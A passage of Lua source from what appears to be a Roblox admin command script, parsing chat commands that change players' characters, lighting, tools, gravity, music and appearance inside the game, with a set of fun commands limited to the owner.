if obj:IsA("BasePart") then obj.Transparency = 0 if obj:findFirstChild("face") then obj.face.Transparency = 0 end elseif obj:IsA("Hat") and obj:findFirstChild("Handle") then obj.Handle.Transparency = 0 end
end
end
end))
end
end

if msg:lower():sub(1,5) == "lock " then
local plrz = GetPlr(plr, msg:lower():sub(6))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character then 
for a, obj in pairs(v.Character:children()) do 
if obj:IsA("BasePart") then obj.Locked = true elseif obj:IsA("Hat") and obj:findFirstChild("Handle") then obj.Handle.Locked = true end
end
end
end))
end
end

if msg:lower():sub(1,7) == "unlock " then
local plrz = GetPlr(plr, msg:lower():sub(8))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character then 
for a, obj in pairs(v.Character:children()) do 
if obj:IsA("BasePart") then obj.Locked = false elseif obj:IsA("Hat") and obj:findFirstChild("Handle") then obj.Handle.Locked = false end
end
end
end))
end
end

if msg:lower():sub(1,8) == "explode " then
local plrz = GetPlr(plr, msg:lower():sub(9))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Torso") then 
local ex = Instance.new("Explosion", game.Workspace) ex.Position = v.Character.Torso.Position
end
end))
end
end

if msg:lower():sub(1,4) == "age " then
local plrz = GetPlr(plr, msg:lower():sub(5))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v then Message(v.Name .. "'s age", tostring(v.AccountAge), false, {plr}) end
end))
end
end

if msg:lower():sub(1,5) == "fire " then
local plrz = GetPlr(plr, msg:lower():sub(6))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Torso") then 
local cl = Instance.new("Fire", v.Character.Torso) table.insert(objects, cl)
end
end))
end
end

if msg:lower():sub(1,7) == "unfire " then
local plrz = GetPlr(plr, msg:lower():sub(8))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Torso") then 
for z, cl in pairs(v.Character.Torso:children()) do if cl:IsA("Fire") then cl:Destroy() end end
end
end))
end
end

if msg:lower():sub(1,6) == "smoke " then
local plrz = GetPlr(plr, msg:lower():sub(7))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Torso") then 
local cl = Instance.new("Smoke", v.Character.Torso) table.insert(objects, cl)
end
end))
end
end

if msg:lower():sub(1,8) == "unsmoke " then
local plrz = GetPlr(plr, msg:lower():sub(9))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Torso") then 
for z, cl in pairs(v.Character.Torso:children()) do if cl:IsA("Smoke") then cl:Destroy() end end
end
end))
end
end

if msg:lower():sub(1,9) == "sparkles " then
local plrz = GetPlr(plr, msg:lower():sub(10))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Torso") then 
local cl = Instance.new("Sparkles", v.Character.Torso) table.insert(objects, cl)
end
end))
end
end

if msg:lower():sub(1,11) == "unsparkles " then
local plrz = GetPlr(plr, msg:lower():sub(12))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Torso") then 
for z, cl in pairs(v.Character.Torso:children()) do if cl:IsA("Sparkles") then cl:Destroy() end end
end
end))
end
end

if msg:lower():sub(1,3) == "ff " then
local plrz = GetPlr(plr, msg:lower():sub(4))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character then Instance.new("ForceField", v.Character) end
end))
end
end

if msg:lower():sub(1,5) == "unff " then
local plrz = GetPlr(plr, msg:lower():sub(6))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character then 
for z, cl in pairs(v.Character:children()) do if cl:IsA("ForceField") then cl:Destroy() end end
end
end))
end
end

if msg:lower():sub(1,7) == "punish " then
local plrz = GetPlr(plr, msg:lower():sub(8))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character then 
v.Character.Parent = game:service("Lighting")
end
end))
end
end

if msg:lower():sub(1,9) == "unpunish " then
local plrz = GetPlr(plr, msg:lower():sub(10))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character then 
v.Character.Parent = game:service("Workspace")
v.Character:MakeJoints()
end
end))
end
end

if msg:lower():sub(1,7) == "freeze " then
local plrz = GetPlr(plr, msg:lower():sub(8))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then 
for a, obj in pairs(v.Character:children()) do 
if obj:IsA("BasePart") then obj.Anchored = true end v.Character.Humanoid.WalkSpeed = 0
end
end
end))
end
end

if msg:lower():sub(1,5) == "thaw " then
local plrz = GetPlr(plr, msg:lower():sub(6))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then 
for a, obj in pairs(v.Character:children()) do 
if obj:IsA("BasePart") then obj.Anchored = false end v.Character.Humanoid.WalkSpeed = 16
end
end
end))
end
end

if msg:lower():sub(1,5) == "heal " then
local plrz = GetPlr(plr, msg:lower():sub(6))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then 
v.Character.Humanoid.Health = v.Character.Humanoid.MaxHealth
end
end))
end
end

if msg:lower():sub(1,4) == "god " then
local plrz = GetPlr(plr, msg:lower():sub(5))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then 
v.Character.Humanoid.MaxHealth = math.huge
v.Character.Humanoid.Health = 9e9
end
end))
end
end

if msg:lower():sub(1,6) == "ungod " then
local plrz = GetPlr(plr, msg:lower():sub(7))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then 
v.Character.Humanoid.MaxHealth = 100
v.Character.Humanoid.Health = v.Character.Humanoid.MaxHealth
end
end))
end
end

if msg:lower():sub(1,8) == "ambient " then
local chk1 = msg:lower():sub(9):find(" ") + 8
local chk2 = msg:sub(chk1+1):find(" ") + chk1
game.Lighting.Ambient = Color3.new(msg:sub(9,chk1-1),msg:sub(chk1+1,chk2-1),msg:sub(chk2+1))
end

if msg:lower():sub(1,11) == "brightness " then
game.Lighting.Brightness = msg:sub(12)
end

if msg:lower():sub(1,5) == "time " then
game.Lighting.TimeOfDay = msg:sub(6)
end

if msg:lower():sub(1,9) == "fogcolor " then
local chk1 = msg:lower():sub(10):find(" ") + 9
local chk2 = msg:sub(chk1+1):find(" ") + chk1
game.Lighting.FogColor = Color3.new(msg:sub(10,chk1-1),msg:sub(chk1+1,chk2-1),msg:sub(chk2+1))
end

if msg:lower():sub(1,7) == "fogend " then
game.Lighting.FogEnd = msg:sub(8)
end

if msg:lower():sub(1,9) == "fogstart " then
game.Lighting.FogStart = msg:sub(10)
end

if msg:lower():sub(1,7) == "btools " then
local plrz = GetPlr(plr, msg:lower():sub(8))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v:findFirstChild("Backpack") then 
local t1 = Instance.new("HopperBin", v.Backpack) t1.Name = "Move" t1.BinType = "GameTool"
local t2 = Instance.new("HopperBin", v.Backpack) t2.Name = "Clone" t2.BinType = "Clone"
local t3 = Instance.new("HopperBin", v.Backpack) t3.Name = "Delete" t3.BinType = "Hammer"
local t4= Instance.new("HopperBin", v.Backpack) t4.Name = "Resize"
local t5 = game:GetService("ServerStorage").F3X:Clone() t5.Parent=v.Backpack
local cl4 = script.BtoolsScript:Clone() cl4.Parent = t4 cl4.Disabled = false
end
end))
end
end

if msg:lower():sub(1,12) == "startergive " then
local chk1 = msg:lower():sub(13):find(" ") + 12
local plrz = GetPlr(plr, msg:lower():sub(13,chk1-1))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v:findFirstChild("StarterGear") and game:findFirstChild("Lighting") then 
for a, tool in pairs(game.Lighting:children()) do
if tool:IsA("Tool") or tool:IsA("HopperBin") then
if msg:lower():sub(chk1+1) == "all" or tool.Name:lower():find(msg:lower():sub(chk1+1)) == 1 then tool:Clone().Parent = v.StarterGear end
end
end
end
end))
end
end

if msg:lower():sub(1,5) == "give " then
local chk1 = msg:lower():sub(6):find(" ") + 5
local plrz = GetPlr(plr, msg:lower():sub(6,chk1-1))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v:findFirstChild("Backpack") and game:findFirstChild("Lighting") then 
for a, tool in pairs(game.Lighting:children()) do
if tool:IsA("Tool") or tool:IsA("HopperBin") then
if msg:lower():sub(chk1+1) == "all" or tool.Name:lower():find(msg:lower():sub(chk1+1)) == 1 then tool:Clone().Parent = v.Backpack end
end
end
end
end))
end
end

if msg:lower():sub(1,12) == "removetools " then
local plrz = GetPlr(plr, msg:lower():sub(13))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v:findFirstChild("Backpack") then 
for a, tool in pairs(v.Character:children()) do if tool:IsA("Tool") or tool:IsA("HopperBin") then tool:Destroy() end end
for a, tool in pairs(v.Backpack:children()) do if tool:IsA("Tool") or tool:IsA("HopperBin") then tool:Destroy() end end
end
end))
end
end

if msg:lower():sub(1,5) == "rank " then
local chk1 = msg:lower():sub(6):find(" ") + 5
local plrz = GetPlr(plr, msg:lower():sub(6,chk1-1))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v:IsInGroup(msg:sub(chk1+1)) then 
Hint("[" .. v:GetRankInGroup(msg:sub(chk1+1)) .. "] " .. v:GetRoleInGroup(msg:sub(chk1+1)), {plr})
elseif v and not v:IsInGroup(msg:sub(chk1+1))then
Hint(v.Name .. " is not in the group " .. msg:sub(chk1+1), {plr})
end
end))
end
end

if msg:lower():sub(1,7) == "damage " then
local chk1 = msg:lower():sub(8):find(" ") + 7
local plrz = GetPlr(plr, msg:lower():sub(8,chk1-1))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then 
v.Character.Humanoid:TakeDamage(msg:sub(chk1+1))
end
end))
end
end

if msg:lower():sub(1,5) == "grav " then
local plrz = GetPlr(plr, msg:lower():sub(6))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Torso") then 
for a, frc in pairs(v.Character.Torso:children()) do if frc.Name == "BFRC" then frc:Destroy() end end
end
end))
end
end

if msg:lower():sub(1,8) == "setgrav " then
local chk1 = msg:lower():sub(9):find(" ") + 8
local plrz = GetPlr(plr, msg:lower():sub(9,chk1-1))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Torso") then 
for a, frc in pairs(v.Character.Torso:children()) do if frc.Name == "BFRC" then frc:Destroy() end end
local frc = Instance.new("BodyForce", v.Character.Torso) frc.Name = "BFRC" frc.force = Vector3.new(0,0,0)
for a, prt in pairs(v.Character:children()) do if prt:IsA("BasePart") then frc.force = frc.force - Vector3.new(0,prt:GetMass()*msg:sub(chk1+1),0) elseif prt:IsA("Hat") then frc.force = frc.force - Vector3.new(0,prt.Handle:GetMass()*msg:sub(chk1+1),0) end end
end
end))
end
end

if msg:lower():sub(1,7) == "nograv " then
local plrz = GetPlr(plr, msg:lower():sub(8))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Torso") then 
for a, frc in pairs(v.Character.Torso:children()) do if frc.Name == "BFRC" then frc:Destroy() end end
local frc = Instance.new("BodyForce", v.Character.Torso) frc.Name = "BFRC" frc.force = Vector3.new(0,0,0)
for a, prt in pairs(v.Character:children()) do if prt:IsA("BasePart") then frc.force = frc.force + Vector3.new(0,prt:GetMass()*196.25,0) elseif prt:IsA("Hat") then frc.force = frc.force + Vector3.new(0,prt.Handle:GetMass()*196.25,0) end end
end
end))
end
end

if msg:lower():sub(1,7) == "health " then
local chk1 = msg:lower():sub(8):find(" ") + 7
local plrz = GetPlr(plr, msg:lower():sub(8,chk1-1))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then 
v.Character.Humanoid.MaxHealth = msg:sub(chk1+1)
v.Character.Humanoid.Health = v.Character.Humanoid.MaxHealth
end
end))
end
end

if msg:lower():sub(1,6) == "speed " then
local chk1 = msg:lower():sub(7):find(" ") + 6
local plrz = GetPlr(plr, msg:lower():sub(7,chk1-1))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then 
v.Character.Humanoid.WalkSpeed = msg:sub(chk1+1)
end
end))
end
end

if msg:lower():sub(1,5) == "team " then
local chk1 = msg:lower():sub(6):find(" ") + 5
local plrz = GetPlr(plr, msg:lower():sub(6,chk1-1))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and game:findFirstChild("Teams") then 
for a, tm in pairs(game.Teams:children()) do
if tm.Name:lower():find(msg:lower():sub(chk1+1)) == 1 then v.TeamColor = tm.TeamColor end
end
end
end))
end
end

if msg:lower():sub(1,6) == "place " then
local chk1 = msg:lower():sub(7):find(" ") + 6
local plrz = GetPlr(plr, msg:lower():sub(7,chk1-1))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v:findFirstChild("PlayerGui") then 
local cl = script.PlaceScript:Clone() cl.id.Value=msg:sub(chk1+1) cl.Parent = v.PlayerGui cl.Disabled = false
end
end))
end
end

if msg:lower():sub(1,3) == "tp " then
local chk1 = msg:lower():sub(4):find(" ") + 3
local plrz = GetPlr(plr, msg:lower():sub(4,chk1-1))
local plrz2 = GetPlr(plr, msg:lower():sub(chk1+1))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
for i2, v2 in pairs(plrz2) do
if v and v2 and v.Character and v2.Character and v.Character:findFirstChild("Torso") and v2.Character:findFirstChild("Torso") then
v.Character.Torso.CFrame = v2.Character.Torso.CFrame + Vector3.new(math.random(-1,1),0,math.random(-1,1))
end
end
end))
end
end

if msg:lower():sub(1,3) == "to " then
local plrz = GetPlr(plr, msg:lower():sub(4))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character then 
plr.Character.Torso.CFrame=v.Character.Torso.CFrame + Vector3.new(math.random(-1,1),0,math.random(-1,1))
end
end))
end
end

if msg:lower():sub(1,7) == "change " then
local chk1 = msg:lower():sub(8):find(" ") + 7
local chk2 = msg:sub(chk1+1):find(" ") + chk1
local plrz = GetPlr(plr, msg:lower():sub(8,chk1-1))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v:findFirstChild("leaderstats") then 
for a, st in pairs(v.leaderstats:children()) do
if st.Name:lower():find(msg:sub(chk1+1,chk2-1)) == 1 then st.Value = msg:sub(chk2+1) end
end
end
end))
end
end

if msg:lower():sub(1,6) == "shirt " then
local chk1 = msg:lower():sub(7):find(" ") + 6
local plrz = GetPlr(plr, msg:lower():sub(7,chk1-1))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character then 
for i,v in pairs(v.Character:children()) do
if v:IsA("Shirt") then local cl = v:Clone() cl.Parent = v.Parent cl.ShirtTemplate = "http://www.roblox.com/asset/?id=" .. chk1 v:Destroy() end
end
end
end))
end
end

if msg:lower():sub(1,6) == "pants " then
local chk1 = msg:lower():sub(7):find(" ") + 6
local plrz = GetPlr(plr, msg:lower():sub(7,chk1-1))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character then 
for i,v in pairs(v.Character:children()) do
if v:IsA("Pants") then local cl = v:Clone() cl.Parent = v.Parent cl.PantsTemplate = "http://www.roblox.com/asset/?id=" .. chk1 v:Destroy() end
end
end
end))
end
end

if msg:lower():sub(1,5) == "face " then
local chk1 = msg:lower():sub(6):find(" ") + 5
local plrz = GetPlr(plr, msg:lower():sub(6,chk1-1))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Head") and v.Character.Head:findFirstChild("face") then 
v.Character.Head:findFirstChild("face").Texture = "http://www.roblox.com/asset/?id=" .. chk1
end
end))
end
end

---------------------
--   FunCommands   --
---------------------
if FunCommands or plr.userId == game.CreatorId or ChkOwner(plr.Name:lower()) then
	
if msg:lower():sub(1,8) == "swagify " then
local plrz = GetPlr(plr, msg:lower():sub(9))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character then
for i,v in pairs(v.Character:children()) do
if v.Name == "Shirt" then local cl = v:Clone() cl.Parent = v.Parent cl.ShirtTemplate = "http://www.roblox.com/asset/?id=109163376" v:Destroy() end
if v.Name == "Pants" then local cl = v:Clone() cl.Parent = v.Parent cl.PantsTemplate = "http://www.roblox.com/asset/?id=109163376" v:Destroy() end
end
for a,cp in pairs(v.Character:children()) do if cp.Name == "EpicCape" then cp:Destroy() end end
local cl = script.LocalScriptBase:Clone() cl.Name = "CapeScript" cl.Code.Value = [[local plr = game.Players.LocalPlayer
repeat wait() until plr and plr.Character and plr.Character:findFirstChild("Torso")
local torso = plr.Character.Torso
local p = Instance.new("Part", torso.Parent) p.Name = "EpicCape" p.Anchored = false
p.CanCollide = false p.TopSurface = 0 p.BottomSurface = 0 p.BrickColor = BrickColor.new("Pink") local dec = Instance.new("Decal", p) dec.Face = 2 dec.Texture = "http://www.roblox.com/asset/?id=109301474" p.formFactor = "Custom"
p.Size = Vector3.new(.2,.2,.2)
local msh = Instance.new("BlockMesh", p) msh.Scale = Vector3.new(9,17.5,.5)
local motor1 = Instance.new("Motor", p)
motor1.Part0 = p
motor1.Part1 = torso
motor1.MaxVelocity = .01
motor1.C0 = CFrame.new(0,1.75,0)*CFrame.Angles(0,math.rad(90),0)
motor1.C1 = CFrame.new(0,1,.45)*CFrame.Angles(0,math.rad(90),0)
local wave = false
repeat wait(1/44)
local ang = 0.1
local oldmag = torso.Velocity.magnitude
local mv = .002
if wave then ang = ang + ((torso.Velocity.magnitude/10)*.05)+.05 wave = false else wave = true end
ang = ang + math.min(torso.Velocity.magnitude/11, .5)
motor1.MaxVelocity = math.min((torso.Velocity.magnitude/111), .04) + mv
motor1.DesiredAngle = -ang
if motor1.CurrentAngle < -.2 and motor1.DesiredAngle > -.2 then motor1.MaxVelocity = .04 end
repeat wait() until motor1.CurrentAngle == motor1.DesiredAngle or math.abs(torso.Velocity.magnitude - oldmag)  >= (torso.Velocity.magnitude/10) + 1
if torso.Velocity.magnitude < .1 then wait(.1) end
until not p or p.Parent ~= torso.Parent
script:Destroy()
]] cl.Parent = v.PlayerGui cl.Disabled = false
end
end))
end
end

if msg:lower():sub(1,6) == "music " then
for i, v in pairs(game.Workspace:children()) do if v:IsA("Sound") then v:Destroy() end end
local id = msg:sub(7)
local pitch = 1
if tostring(id):lower():find("caramell") then id = 2303479 end
if tostring(id):find("epic") then id = 27697743 pitch = 2.5 end
if tostring(id):find("rick") then id = 2027611 end
if tostring(id):find("halo") then id = 1034065  end
if tostring(id):find("pokemon") then id = 1372261 end
if tostring(id):find("cursed") then id = 1372257 end
if tostring(id):find("extreme") then id = 11420933 end
if tostring(id):find("awaken") then id = 27697277 end
if tostring(id):find("alone") then id = 27697392 end
if tostring(id):find("mario") then id = 1280470 end
if tostring(id):find("choir") then id = 1372258 end
if tostring(id):find("chrono") then id = 1280463 end
if tostring(id):find("dotr") then id = 11420922 end
if tostring(id):find("entertain") then id = 27697267 end
if tostring(id):find("fantasy") then id = 1280473 end
if tostring(id):find("final") then id = 1280414 end
if tostring(id):find("emblem") then id = 1372259 end
if tostring(id):find("flight") then id = 27697719 end
if tostring(id):find("banjo") then id = 27697298 end
if tostring(id):find("gothic") then id = 27697743 end
if tostring(id):find("hiphop") then id = 27697735 end
if tostring(id):find("intro") then id = 27697707 end
if tostring(id):find("mule") then id = 1077604 end
if tostring(id):find("film") then id = 27697713 end
if tostring(id):find("nezz") then id = 8610025 end
if tostring(id):find("angel") then id = 1372260 end
if tostring(id):find("resist") then id = 27697234 end
if tostring(id):find("schala") then id = 5985787 end
if tostring(id):find("organ") then id = 11231513 end
if tostring(id):find("tunnel") then id = 9650822 end
if tostring(id):find("spanish") then id = 5982975 end
if tostring(id):find("venom") then id = 1372262 end
if tostring(id):find("wind") then id = 1015394 end
if tostring(id):find("guitar") then id = 5986151 end
if tostring(id):find("roboat") then id=233992960 end
local s = Instance.new("Sound", game.Workspace) s.SoundId = "http://www.roblox.com/asset/?id=" .. id s.Volume = 1 s.Pitch = pitch s.Looped = true s.archivable = false repeat s:Play() wait(2.5) s:Stop() wait(.5) s:Play() until s.IsPlaying
end

if msg:lower() == "stopmusic" then
for i, v in pairs(game.Workspace:children()) do if v:IsA("Sound") then v:Destroy() end end
end

if msg:lower() == "musiclist" then
if plr.PlayerGui:findFirstChild("MUSICGUI") then return end
local scr, cmf, ent, num = ScrollGui() scr.Name = "MUSICGUI" scr.Parent = plr.PlayerGui
local list = {"caramell","epic","rick","halo","pokemon","cursed","extreme","awaken","alone","mario","choir","chrono","dotr","entertain","fantasy","final","emblem","flight","banjo","gothic","hiphop","intro","mule","film","nezz","angel","resist","schala","organ","tunnel","spanish","venom","wind","guitar","roboat"}
for i, v in pairs(list) do local cl = ent:Clone() cl.Parent = cmf cl.Text = v cl.Position = UDim2.new(0,0,0,num*20) num = num +1 end
end

if msg:lower():sub(1,4) == "fly " then
local plrz = GetPlr(plr, msg:lower():sub(5))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v:findFirstChild("PlayerGui") then
local cl = script.FlyScript:Clone() 
cl.Parent = v.PlayerGui cl.Disabled = false
end
end))
end
end

if msg:lower():sub(1,6) == "unfly " then
local plrz = GetPlr(plr, msg:lower():sub(7))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v:findFirstChild("PlayerGui") and v.Character and v.Character:findFirstChild("Torso") and v.Character:findFirstChild("Humanoid") then
for a, q in pairs(v.PlayerGui:children()) do if q.Name == "FlyScript" then q:Destroy() end end
for a, q in pairs(v.Character.Torso:children()) do if q.Name == "BodyGyro" or q.Name == "BodyVelocity" then q:Destroy() end end
wait(.1) v.Character.Humanoid.PlatformStand = false
end
end))
end
end

if msg:lower() == "disco" then
for i, v in pairs(lobjs) do v:Destroy() end
local cl = script.ScriptBase:Clone() cl.Name = "LightEdit" cl.Code.Value = [[repeat wait(.1) local color = Color3.new(math.random(255)/255,math.random(255)/255,math.random(255)/255)
game.Lighting.Ambient = color
game.Lighting.FogColor = color
until nil]]
table.insert(lobjs, cl) cl.Parent = game.Workspace cl.Disabled = false
end

if msg:lower() == "flash" then
for i, v in pairs(lobjs) do v:Destroy() end
local cl = script.ScriptBase:Clone() cl.Name = "LightEdit" cl.Code.Value = [[repeat wait(.1) 
game.Lighting.Ambient = Color3.new(1,1,1)
game.Lighting.FogColor = Color3.new(1,1,1)
game.Lighting.Brightness = 1
game.Lighting.TimeOfDay = 14
wait(.1) 
game.Lighting.Ambient = Color3.new(0,0,0)
game.Lighting.FogColor = Color3.new(0,0,0)
game.Lighting.Brightness = 0
game.Lighting.TimeOfDay = 0
until nil]]
table.insert(lobjs, cl) cl.Parent = game.Workspace cl.Disabled = false
end

if msg:lower():sub(1,5) == "spin " then
local plrz = GetPlr(plr, msg:lower():sub(6))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
for i,v in pairs(v.Character.Torso:children()) do if v.Name == "SPINNER" then v:Destroy() end end
local torso = v.Character:findFirstChild("Torso")
local bg = Instance.new("BodyGyro", torso) bg.Name = "SPINNER" bg.maxTorque = Vector3.new(0,math.huge,0) bg.P = 11111 bg.cframe = torso.CFrame table.insert(objects,bg)
repeat wait(1/44) bg.cframe = bg.cframe * CFrame.Angles(0,math.rad(30),0)
until not bg or bg.Parent ~= torso
end
end))
end
end

if msg:lower():sub(1,7) == "unspin " then
local plrz = GetPlr(plr, msg:lower():sub(8))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
for a,q in pairs(v.Character.Torso:children()) do if q.Name == "SPINNER" then q:Destroy() end end
end
end))
end
end

if msg:lower():sub(1,4) == "dog " then
local plrz = GetPlr(plr, msg:lower():sub(5))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
if v.Character:findFirstChild("Shirt") then v.Character.Shirt.Parent = v.Character.Torso end
if v.Character:findFirstChild("Pants") then v.Character.Pants.Parent = v.Character.Torso end
v.Character.Torso.Transparency = 1
v.Character.Torso.Neck.C0 = CFrame.new(0,-.5,-2) * CFrame.Angles(math.rad(90),math.rad(180),0)
v.Character.Torso["Right Shoulder"].C0 = CFrame.new(.5,-1.5,-1.5) * CFrame.Angles(0,math.rad(90),0)
v.Character.Torso["Left Shoulder"].C0 = CFrame.new(-.5,-1.5,-1.5) * CFrame.Angles(0,math.rad(-90),0)
v.Character.Torso["Right Hip"].C0 = CFrame.new(1.5,-1,1.5) * CFrame.Angles(0,math.rad(90),0)
v.Character.Torso["Left Hip"].C0 = CFrame.new(-1.5,-1,1.5) * CFrame.Angles(0,math.rad(-90),0)
local new = Instance.new("Seat", v.Character) new.Name = "FAKETORSO" new.formFactor = "Symmetric" new.TopSurface = 0 new.BottomSurface = 0 new.Size = Vector3.new(3,1,4) new.CFrame = v.Character.Torso.CFrame
local bf = Instance.new("BodyForce", new) bf.force = Vector3.new(0,new:GetMass()*196.25,0)
local weld = Instance.new("Weld", v.Character.Torso) weld.Part0 = v.Character.Torso weld.Part1 = new weld.C0 = CFrame.new(0,-.5,0)
for a, part in pairs(v.Character:children()) do if part:IsA("BasePart") then part.BrickColor = BrickColor.new("Brown") elseif part:findFirstChild("NameTag") then part.Head.BrickColor = BrickColor.new("Brown") end end
end
end))
end
end

if msg:lower():sub(1,6) == "undog " then
local plrz = GetPlr(plr, msg:lower():sub(7))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
if v.Character.Torso:findFirstChild("Shirt") then v.Character.Torso.Shirt.Parent = v.Character end
if v.Character.Torso:findFirstChild("Pants") then v.Character.Torso.Pants.Parent = v.Character end
v.Character.Torso.Transparency = 0
v.Character.Torso.Neck.C0 = CFrame.new(0,1,0) * CFrame.Angles(math.rad(90),math.rad(180),0)
v.Character.Torso["Right Shoulder"].C0 = CFrame.new(1,.5,0) * CFrame.Angles(0,math.rad(90),0)
v.Character.Torso["Left Shoulder"].C0 = CFrame.new(-1,.5,0) * CFrame.Angles(0,math.rad(-90),0)
v.Character.Torso["Right Hip"].C0 = CFrame.new(1,-1,0) * CFrame.Angles(0,math.rad(90),0)
v.Character.Torso["Left Hip"].C0 = CFrame.new(-1,-1,0) * CFrame.Angles(0,math.rad(-90),0)
for a, part in pairs(v.Character:children()) do if part:IsA("BasePart") then part.BrickColor = BrickColor.new("White") if part.Name == "FAKETORSO" then part:Destroy() end elseif part:findFirstChild("NameTag") then part.Head.BrickColor = BrickColor.new("White") end end
end
end))
end
end

if msg:lower():sub(1,8) == "creeper " then
local plrz = GetPlr(plr, msg:lower():sub(9))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
if v.Character:findFirstChild("Shirt") then v.Character.Shirt.Parent = v.Character.Torso end
if v.Character:findFirstChild("Pants") then v.Character.Pants.Parent = v.Character.Torso end
v.Character.Torso.Transparency = 0
v.Character.Torso.Neck.C0 = CFrame.new(0,1,0) * CFrame.Angles(math.rad(90),math.rad(180),0)
v.Character.Torso["Right Shoulder"].C0 = CFrame.new(0,-1.5,-.5) * CFrame.Angles(0,math.rad(90),0)
v.Character.Torso["Left Shoulder"].C0 = CFrame.new(0,-1.5,-.5) * CFrame.Angles(0,math.rad(-90),0)
v.Character.Torso["Right Hip"].C0 = CFrame.new(0,-1,.5) * CFrame.Angles(0,math.rad(90),0)
v.Character.Torso["Left Hip"].C0 = CFrame.new(0,-1,.5) * CFrame.Angles(0,math.rad(-90),0)
for a, part in pairs(v.Character:children()) do if part:IsA("BasePart") then part.BrickColor = BrickColor.new("Bright green") if part.Name == "FAKETORSO" then part:Destroy() end elseif part:findFirstChild("NameTag") then part.Head.BrickColor = BrickColor.new("Bright green") end end
end
end))
end
end

if msg:lower():sub(1,10) == "uncreeper " then
local plrz = GetPlr(plr, msg:lower():sub(11))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
if v.Character.Torso:findFirstChild("Shirt") then v.Character.Torso.Shirt.Parent = v.Character end
if v.Character.Torso:findFirstChild("Pants") then v.Character.Torso.Pants.Parent = v.Character end
v.Character.Torso.Transparency = 0
v.Character.Torso.Neck.C0 = CFrame.new(0,1,0) * CFrame.Angles(math.rad(90),math.rad(180),0)
v.Character.Torso["Right Shoulder"].C0 = CFrame.new(1,.5,0) * CFrame.Angles(0,math.rad(90),0)
v.Character.Torso["Left Shoulder"].C0 = CFrame.new(-1,.5,0) * CFrame.Angles(0,math.rad(-90),0)
v.Character.Torso["Right Hip"].C0 = CFrame.new(1,-1,0) * CFrame.Angles(0,math.rad(90),0)
v.Character.Torso["Left Hip"].C0 = CFrame.new(-1,-1,0) * CFrame.Angles(0,math.rad(-90),0)
